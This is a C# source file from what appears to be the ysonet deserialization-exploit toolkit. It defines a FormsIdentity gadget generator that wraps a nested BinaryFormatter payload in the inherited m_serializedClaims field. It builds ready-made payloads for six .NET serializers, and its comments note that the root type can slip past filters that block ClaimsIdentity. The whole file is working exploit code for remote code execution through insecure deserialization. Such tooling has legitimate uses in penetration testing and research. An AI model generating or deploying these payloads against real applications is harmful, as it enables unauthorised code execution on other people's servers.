using System;
using System.Collections.Generic;
using System.IO;
using ysonet.Helpers;
using ysonet.Helpers.ModifiedVulnerableBinaryFormatters;

namespace ysonet.Generators
{
    public class FormsIdentityGenerator : GenericGenerator
    {
        // Discovery facets (category search only): carries a BinaryFormatter payload
        // in System.Web.Security.FormsIdentity (System.Web, built-in).
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.NestedDeserialization)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // reaches the 4.5+ ClaimsIdentity sink; fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));
        }

        // FormsIdentity is [Serializable], derives from ClaimsIdentity, and is NOT
        // ISerializable. The inherited private field m_serializedClaims is the sink:
        // ClaimsIdentity.OnDeserializedMethod (runs only when the object is not
        // ISerializable) calls DeserializeClaims, which base64-decodes the field and
        // runs a nested BinaryFormatter.Deserialize. Same sink as the ClaimsIdentity
        // gadget, reached through a different root type, useful when a target accepts or
        // casts FormsIdentity but filters ClaimsIdentity.
        //
        // Two derived-type details drive the layouts below:
        // - For the field-based formatters (BinaryFormatter/LosFormatter/SoapFormatter),
        //   FormatterServices exposes the inherited private base field under the prefixed
        //   name "ClaimsIdentity+m_serializedClaims" (short base type name, no ancestry
        //   clash). SoapFormatter XML-encodes the plus sign as "_x002B_".
        // - FormsIdentity is in System.Web, so the BinaryFormatter stream needs a real
        //   BinaryAssembly record and an ObjectWithMapTypedAssemId map (not the mscorlib
        //   assemId 0 form used by ClaimsIdentity).
        // - The DataContract serializers model ClaimsIdentity as a BASE data contract, so
        //   they use the plain member name m_serializedClaims in the Security.Claims
        //   contract namespace.
        // FormsIdentity's own required field _Ticket (System.Web.Security.FormsAuthenticationTicket)
        // is emitted as null so the payload does not depend on Simple-mode tolerance;
        // a null ticket is safe because FormsIdentity.AddNameClaim checks _Ticket != null.
        public override string AdditionalInfo()
        {
            return "System.Web.Security.FormsIdentity (System.Web, built-in) inherits ClaimsIdentity; "
                + "sets the inherited ClaimsIdentity+m_serializedClaims field, which the OnDeserialized "
                + "callback base64-decodes and runs through a nested BinaryFormatter. Alternate root type "
                + "for the ClaimsIdentity nested-BinaryFormatter sink.";
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "SoapFormatter", "DataContractSerializer", "DataContractJsonSerializer", "NetDataContractSerializer", "LosFormatter" };
        }

        public override string Finders()
        {
            return "Soroush Dalili";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Bridged, GadgetTags.OnDeserialized };
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        private const string SystemWebAssembly = "System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a";

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] binaryFormatterPayload;
            if (BridgedPayload != null)
            {
                binaryFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                IGenerator generator = new TextFormattingRunPropertiesGenerator();
                binaryFormatterPayload = (byte[])generator.GenerateInner("BinaryFormatter", inputArgs);
            }

            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
            {
                // Hand-built NRBF stream. A real BinaryFormatter.Serialize of a FormsIdentity
                // cannot be used because ClaimsIdentity.OnSerializing overwrites
                // m_serializedClaims with the serialization of the live claims. The System.Web
                // root needs a BinaryAssembly record and the ObjectWithMapTypedAssemId form.
                // _Ticket is BinaryTypeEnum.ObjectUser (FormsAuthenticationTicket) set to null;
                // m_serializedClaims is BinaryTypeEnum.String set to the inner payload.
                string payload_bf_json = @"[{'Id': 1,
    'Data': {
      '$type': 'SerializationHeaderRecord',
      'binaryFormatterMajorVersion': 1,
      'binaryFormatterMinorVersion': 0,
      'binaryHeaderEnum': 0,
      'topId': 1,
      'headerId': -1,
      'majorVersion': 1,
      'minorVersion': 0
}},{'Id': 2,
    'TypeName': 'Assembly',
    'Data': {
      '$type': 'BinaryAssembly',
      'assemId': 2,
      'assemblyString': '" + SystemWebAssembly + @"'
}},{'Id': 3,
    'TypeName': 'ObjectWithMapTypedAssemId',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 5,
      'objectId': 1,
      'name': 'System.Web.Security.FormsIdentity',
      'numMembers': 2,
      'memberNames':['_Ticket','ClaimsIdentity+m_serializedClaims'],
      'binaryTypeEnumA':[4,1],
      'typeInformationA':[null,null],
      'typeInformationB':['System.Web.Security.FormsAuthenticationTicket',null],
      'memberAssemIds':[2,0],
      'assemId': 2
}},{'Id': 4,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 1
}},{'Id': 5,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 2,
      'value': '" + b64encoded + @"'
}},{'Id': 6,
    'TypeName': 'MessageEnd',
    'Data': {
      '$type': 'MessageEnd'
}}]";

                MemoryStream ms = AdvancedBinaryFormatterParser.JsonToStream(payload_bf_json);

                if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
                {
                    if (inputArgs.Test)
                    {
                        try
                        {
                            ms.Position = 0;
                            System.Runtime.Serialization.Formatters.Binary.BinaryFormatter bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
                            bf.Deserialize(ms);
                        }
                        catch (Exception err)
                        {
                            Debugging.ShowErrors(inputArgs, err);
                        }
                    }
                    return ms.ToArray();
                }
                else
                {
                    // it is LosFormatter
                    byte[] lfSerializedObj = SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(ms.ToArray());

                    MemoryStream ms2 = new MemoryStream(lfSerializedObj);
                    ms2.Position = 0;
                    if (inputArgs.Test)
                    {
                        try
                        {
                            System.Web.UI.LosFormatter lf = new System.Web.UI.LosFormatter();
                            lf.Deserialize(ms2);
                        }
                        catch (Exception err)
                        {
                            Debugging.ShowErrors(inputArgs, err);
                        }
                    }
                    return lfSerializedObj;
                }
            }
            else if (formatter.ToLower().Equals("soapformatter"))
            {
                // System.Web type: clr/nsassem/<Namespace>/<Assembly> with the assembly string
                // percent-encoded. The inherited base field is the XML-encoded prefixed name.
                string payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
<SOAP-ENV:Body>
<a1:FormsIdentity id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/System.Web.Security/System.Web%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db03f5f7f11d50a3a"">
<_Ticket xsi:null=""1""/>
<ClaimsIdentity_x002B_m_serializedClaims id=""ref-5"">{b64encoded}</ClaimsIdentity_x002B_m_serializedClaims>
</a1:FormsIdentity>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
";
                if (inputArgs.Minify)
                {
                    payload = XmlMinifier.Minify(payload, null, null, FormatterType.SoapFormatter);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.SoapFormatter_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractserializer"))
            {
                // ClaimsIdentity is imported as a BASE data contract, so the sink member is
                // the plain m_serializedClaims in the Security.Claims contract namespace. The
                // required derived member _Ticket is nil. Wrapped with the shared root/type
                // convention so the deserializer can resolve the root type.
                string payload = $@"<root type=""System.Web.Security.FormsIdentity, {SystemWebAssembly}"">
<FormsIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns=""http://schemas.datacontract.org/2004/07/System.Web.Security"">
<m_serializedClaims xmlns=""http://schemas.datacontract.org/2004/07/System.Security.Claims"">{b64encoded}</m_serializedClaims>
<_Ticket i:nil=""true""/>
</FormsIdentity>
</root>";

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlMinifier.Minify(payload, new string[] { "System.Web" }, null);
                    }
                    else
                    {
                        payload = XmlMinifier.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root", "type");
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("netdatacontractserializer"))
            {
                // Same base/derived data members as DCS, with NDCS z:Type/z:Assembly metadata
                // naming the System.Web root.
                string payload = $@"<FormsIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" z:Id=""1"" z:Type=""System.Web.Security.FormsIdentity"" z:Assembly=""{SystemWebAssembly}"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns=""http://schemas.datacontract.org/2004/07/System.Web.Security"">
<m_serializedClaims z:Id=""2"" xmlns=""http://schemas.datacontract.org/2004/07/System.Security.Claims"">{b64encoded}</m_serializedClaims>
<_Ticket i:nil=""true""/>
</FormsIdentity>
";

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlMinifier.Minify(payload, new string[] { "System.Web" }, null);
                    }
                    else
                    {
                        payload = XmlMinifier.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.NetDataContractSerializer_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractjsonserializer"))
            {
                // ClaimsIdentity is a base data contract, so the sink member m_serializedClaims is
                // flat in the JSON. The required derived member _Ticket is null. The target must
                // deserialize with FormsIdentity as the root type.
                string payload = $@"{{""m_serializedClaims"":""{b64encoded}"",""_Ticket"":null}}";
                if (inputArgs.Minify)
                {
                    payload = inputArgs.UseSimpleType ? JsonMinifier.Minify(payload, new string[] { "System.Web" }, null) : JsonMinifier.Minify(payload, null, null);
                }
                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.DataContractJsonSerializer_deserialize(payload, "System.Web.Security.FormsIdentity, " + SystemWebAssembly, null);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
